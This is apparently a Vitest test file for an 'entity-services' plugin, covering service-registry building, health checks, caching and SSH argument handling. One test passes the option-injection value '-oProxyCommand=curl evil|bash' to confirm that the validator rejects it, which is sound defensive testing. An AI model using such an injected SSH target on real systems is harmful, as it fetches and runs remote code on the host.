import { describe, expect, it, vi } from 'vitest';
import type { LoadedPlugin } from '../types';
import { buildServicesRegistry, buildSshExecArgs, getCachedServicesRegistry, registerPluginRoutes, validateSshTarget } from './routes';

function createLoadedPlugin(overrides: Partial<LoadedPlugin> = {}): LoadedPlugin {
  return {
    id: 'entity-services',
    name: 'Entity Services',
    version: '0.1.0',
    kind: 'integration',
    description: 'Services registry',
    capabilities: ['api.routes.register'],
    hooks: [],
    settings: {
      requestTimeoutMs: 1000,
      entityBaseUrl: 'http://entity.local',
      enterpriseAdminUrl: 'http://enterprise.local:3000',
      n8nBaseUrl: 'http://n8n.local:5678',
      vaultwardenBaseUrl: 'http://vault.local:8222',
      discoverGatewayServices: false,
      discoverMacServices: false,
    },
    manifestPath: '/tmp/entity-services/plugin.json',
    directory: '/tmp/entity-services',
    enabled: true,
    routes: [{ basePath: '/api/entity-services', entry: './routes.ts' }],
    status: {
      loaded: true,
      registeredAt: new Date().toISOString(),
      routesMounted: ['/api/entity-services'],
    },
    ...overrides,
  };
}

function createResponse() {
  return {
    status: vi.fn().mockReturnThis(),
    json: vi.fn().mockReturnThis(),
  };
}

describe('entity-services routes', () => {
  it('rejects ssh targets that could be parsed as ssh options', () => {
    expect(() => validateSshTarget('-oProxyCommand=curl evil|bash')).toThrow(
      'SSH target must not start with "-".',
    );
  });

  it('inserts the ssh option terminator before the validated host', () => {
    expect(buildSshExecArgs('book@mac-host', 'echo ok')).toEqual([
      '-o',
      'ConnectTimeout=10',
      '--',
      'book@mac-host',
      'echo ok',
    ]);
  });

  it('builds a registry payload with live service summaries', async () => {
    const entityServices = createLoadedPlugin();
    const entityLinker = createLoadedPlugin({
      id: 'entity-linker',
      name: 'Entity Linker',
      kind: 'behavior',
      enabled: true,
      routes: [{ basePath: '/api/entity-linker', entry: './routes.ts' }],
      status: {
        loaded: true,
        registeredAt: new Date().toISOString(),
        routesMounted: ['/api/entity-linker'],
      },
    });

    const registry = {
      get: (id: string) => {
        if (id === entityServices.id) return entityServices;
        if (id === entityLinker.id) return entityLinker;
        return undefined;
      },
    };

    const fetchImpl = vi.fn(async (url: string) => {
      if (url === 'http://enterprise.local:3000/api/health') {
        return new Response('missing', { status: 404 });
      }

      return new Response('ok', { status: 200 });
    });

    const payload = await buildServicesRegistry(
      {
        plugin: entityServices,
        registry,
      } as any,
      fetchImpl as any,
    );

    expect(payload.services).toHaveLength(2);
    expect(payload.summary.operational).toBe(2);

    const linker = payload.services.find((service) => service.id === 'entity-linker');
    expect(linker).toMatchObject({
      status: 'operational',
      link: { url: 'http://entity.local/api/entity-linker/status', external: true },
    });

    const enterprise = payload.services.find((service) => service.id === 'enterprise-crew-admin');
    expect(enterprise).toMatchObject({
      serviceType: 'external-http',
      status: 'operational',
      visibility: 'managed',
      relevanceReason: 'Curated service definition',
      family: { key: 'enterprise-crew-admin', name: 'Enterprise Crew Admin', memberCount: 1 },
      link: { url: 'http://enterprise.local:3000', external: true },
    });

    expect(linker).toMatchObject({
      visibility: 'managed',
      relevanceReason: 'Entity-managed plugin',
      family: { key: 'entity-linker', name: 'Entity Linker', memberCount: 1 },
    });

    expect(fetchImpl).toHaveBeenCalledWith(
      'http://enterprise.local:3000/api/health',
      expect.objectContaining({ method: 'GET' }),
    );
  });

  it('preserves legacy external admin settings', async () => {
    const entityServices = createLoadedPlugin({
      settings: {
        requestTimeoutMs: 1000,
        entityBaseUrl: 'http://entity.local',
        externalAdminUrl: 'http://legacy-admin.local:3555',
        externalAdminName: 'Legacy Admin',
        discoverGatewayServices: false,
        discoverMacServices: false,
      },
    });

    const payload = await buildServicesRegistry(
      {
        plugin: entityServices,
        registry: {
          get: (id: string) => (id === entityServices.id ? entityServices : undefined),
        },
      } as any,
      vi.fn(async () => new Response('ok', { status: 200 })) as any,
    );

    const enterprise = payload.services.find((service) => service.id === 'enterprise-crew-admin');
    expect(enterprise).toMatchObject({
      name: 'Legacy Admin',
      link: { url: 'http://legacy-admin.local:3555', external: true },
      healthLink: { url: 'http://legacy-admin.local:3555/api/health', external: true },
    });
  });

  it('falls back from blank legacy external admin URL to the default admin service', async () => {
    const entityServices = createLoadedPlugin({
      settings: {
        requestTimeoutMs: 1000,
        entityBaseUrl: 'http://entity.local',
        externalAdminUrl: '',
        externalAdminName: 'External Admin',
        discoverGatewayServices: false,
        discoverMacServices: false,
      },
    });

    const payload = await buildServicesRegistry(
      {
        plugin: entityServices,
        registry: {
          get: (id: string) => (id === entityServices.id ? entityServices : undefined),
        },
      } as any,
      vi.fn(async () => new Response('ok', { status: 200 })) as any,
    );

    const enterprise = payload.services.find((service) => service.id === 'enterprise-crew-admin');
    expect(enterprise).toMatchObject({
      name: 'External Admin',
      link: { url: 'http://entity.local:3002', external: true },
      healthLink: { url: 'http://entity.local:3002/api/health', external: true },
    });
  });

  it('reports disabled or unreachable services as offline', async () => {
    const entityServices = createLoadedPlugin();
    const entityLinker = createLoadedPlugin({
      id: 'entity-linker',
      name: 'Entity Linker',
      enabled: false,
      status: {
        loaded: true,
        registeredAt: new Date().toISOString(),
        routesMounted: [],
      },
    });

    const payload = await buildServicesRegistry(
      {
        plugin: entityServices,
        registry: {
          get: (id: string) => {
            if (id === entityServices.id) return entityServices;
            if (id === entityLinker.id) return entityLinker;
            return undefined;
          },
        },
      } as any,
      vi.fn(async () => {
        throw new Error('connect ECONNREFUSED');
      }) as any,
    );

    expect(payload.summary.offline).toBe(2);
    expect(payload.services.every((service) => service.status === 'offline')).toBe(true);
  });

  it('prefers the live request host over stale tailnet service URLs', async () => {
    const entityServices = createLoadedPlugin({
      settings: {
        ...createLoadedPlugin().settings,
        entityBaseUrl: 'http://100.106.69.9:3000',
        enterpriseAdminUrl: 'http://100.106.69.9:3002',
        discoverGatewayServices: false,
        discoverMacServices: false,
      },
    });
    const entityLinker = createLoadedPlugin({
      id: 'entity-linker',
      name: 'Entity Linker',
      enabled: true,
    });

    const payload = await buildServicesRegistry(
      {
        plugin: entityServices,
        registry: {
          get: (id: string) => {
            if (id === entityServices.id) return entityServices;
            if (id === entityLinker.id) return entityLinker;
            return undefined;
          },
        },
      } as any,
      vi.fn(async () => new Response('ok', { status: 200 })) as any,
      'http://100.104.229.62:3000',
    );

    const linker = payload.services.find((service) => service.id === 'entity-linker');
    const enterprise = payload.services.find((service) => service.id === 'enterprise-crew-admin');

    expect(linker?.link.url).toBe('http://100.104.229.62:3000/api/entity-linker/status');
    expect(enterprise?.link.url).toBe('http://100.104.229.62:3002');
  });

  it('returns a non-empty cold-start registry before full discovery settles', async () => {
    const entityServices = createLoadedPlugin({
      settings: {
        ...createLoadedPlugin().settings,
        requestTimeoutMs: 987654,
        discoverGatewayServices: false,
        discoverMacServices: false,
      },
    });
    const handlers: Record<string, (req: any, res: any) => Promise<any>> = {};
    registerPluginRoutes(
      { get: (route: string, handler: any) => { handlers[`GET ${route}`] = handler; } } as any,
      {
        plugin: entityServices,
        registry: { get: (id: string) => (id === entityServices.id ? entityServices : undefined) },
      } as any,
    );

    let resolveDiscovery!: (value: Response) => void;
    const deferredDiscovery = new Promise<Response>((resolve) => { resolveDiscovery = resolve; });
    const neverSettles = vi.fn(() => deferredDiscovery);
    vi.stubGlobal('fetch', neverSettles);
    const response = createResponse();
    try {
      const handlerPromise = handlers['GET /registry'](
        { protocol: 'http', get: (name: string) => name === 'host' ? 'cold-start.local' : undefined },
        response,
      );
      const completed = await Promise.race([
        handlerPromise.then(() => true),
        new Promise<boolean>((resolve) => setTimeout(() => resolve(false), 50)),
      ]);
      expect(completed).toBe(true);
      expect(response.json).toHaveBeenCalledWith(expect.objectContaining({
        state: 'refreshing',
        partial: true,
        services: expect.arrayContaining([expect.objectContaining({ serviceType: 'internal-plugin' })]),
      }));
      resolveDiscovery(new Response('ok', { status: 200 }));
      await new Promise((resolve) => setTimeout(resolve, 10));

      const completedResponse = createResponse();
      await handlers['GET /registry'](
        { protocol: 'http', get: (name: string) => name === 'host' ? 'cold-start.local' : undefined },
        completedResponse,
      );
      expect(completedResponse.json).toHaveBeenCalledWith(expect.objectContaining({
        state: 'ready',
        partial: false,
      }));
    } finally {
      vi.unstubAllGlobals();
    }
  });

  it('reports a background discovery failure instead of silently presenting a fresh skeleton', async () => {
    const entityServices = createLoadedPlugin({
      settings: { ...createLoadedPlugin().settings, requestTimeoutMs: 876543 },
    });
    const context = {
      plugin: entityServices,
      registry: { get: (id: string) => (id === entityServices.id ? entityServices : undefined) },
    } as any;
    const failingBuild = vi.fn(async () => { throw new Error('discovery exploded'); });

    const initial = await getCachedServicesRegistry(context, 'http://failure.local', failingBuild as any);
    expect(initial).toEqual(expect.objectContaining({ state: 'refreshing', partial: true }));
    await new Promise((resolve) => setTimeout(resolve, 0));

    const failed = await getCachedServicesRegistry(context, 'http://failure.local', failingBuild as any);
    expect(failed).toEqual(expect.objectContaining({
      state: 'error',
      partial: true,
      refreshError: expect.stringContaining('discovery exploded'),
    }));
  });

  it('starts independent background refreshes for distinct registry cache keys', async () => {
    const entityServices = createLoadedPlugin({
      settings: { ...createLoadedPlugin().settings, requestTimeoutMs: 765432 },
    });
    const handlers: Record<string, (req: any, res: any) => Promise<any>> = {};
    registerPluginRoutes(
      { get: (route: string, handler: any) => { handlers[`GET ${route}`] = handler; } } as any,
      {
        plugin: entityServices,
        registry: { get: (id: string) => (id === entityServices.id ? entityServices : undefined) },
      } as any,
    );
    const neverSettles = vi.fn(() => new Promise<Response>(() => undefined));
    vi.stubGlobal('fetch', neverSettles);
    try {
      await handlers['GET /registry'](
        { protocol: 'http', get: (name: string) => name === 'host' ? 'key-a.local' : undefined },
        createResponse(),
      );
      const callsAfterFirstKey = neverSettles.mock.calls.length;
      await handlers['GET /registry'](
        { protocol: 'http', get: (name: string) => name === 'host' ? 'key-b.local' : undefined },
        createResponse(),
      );
      expect(neverSettles.mock.calls.length).toBeGreaterThan(callsAfterFirstKey);
    } finally {
      vi.unstubAllGlobals();
    }
  });

  it('preserves a usable stale registry when refresh capacity is exhausted', async () => {
    vi.useFakeTimers();
    vi.setSystemTime(new Date('2026-08-14T03:00:00.000Z'));
    const entityServices = createLoadedPlugin({
      settings: { ...createLoadedPlugin().settings, requestTimeoutMs: 654321 },
    });
    const context = {
      plugin: entityServices,
      registry: { get: (id: string) => (id === entityServices.id ? entityServices : undefined) },
    } as any;
    const readyPayload = await buildServicesRegistry(
      context,
      vi.fn(async () => new Response('ok', { status: 200 })) as any,
      'http://stale.local',
    );

    try {
      await getCachedServicesRegistry(context, 'http://stale.local', async () => readyPayload);
      await Promise.resolve();
      await Promise.resolve();
      vi.advanceTimersByTime(16_000);

      const neverBuilds = vi.fn(() => new Promise<typeof readyPayload>(() => undefined));
      for (let index = 0; index < 16; index += 1) {
        await getCachedServicesRegistry(context, `http://busy-${index}.local`, neverBuilds as any);
      }

      const stale = await getCachedServicesRegistry(context, 'http://stale.local', neverBuilds as any);
      expect(stale.state).toBe('ready');
      expect(stale.services).toEqual(readyPayload.services);
    } finally {
      vi.useRealTimers();
    }
  });

  it('registers registry endpoints', async () => {
    const entityServices = createLoadedPlugin();
    const handlers: Record<string, (req: any, res: any) => Promise<any>> = {};

    registerPluginRoutes(
      {
        get: (route: string, handler: any) => {
          handlers[`GET ${route}`] = handler;
        },
      } as any,
      {
        plugin: entityServices,
        registry: {
          get: (id: string) => (id === entityServices.id ? entityServices : undefined),
        },
      } as any,
    );

    const response = createResponse();
    await handlers['GET /registry']({}, response);

    expect(response.json).toHaveBeenCalledWith(
      expect.objectContaining({
        plugin: expect.objectContaining({ id: 'entity-services' }),
        services: expect.any(Array),
      }),
    );
  });
});
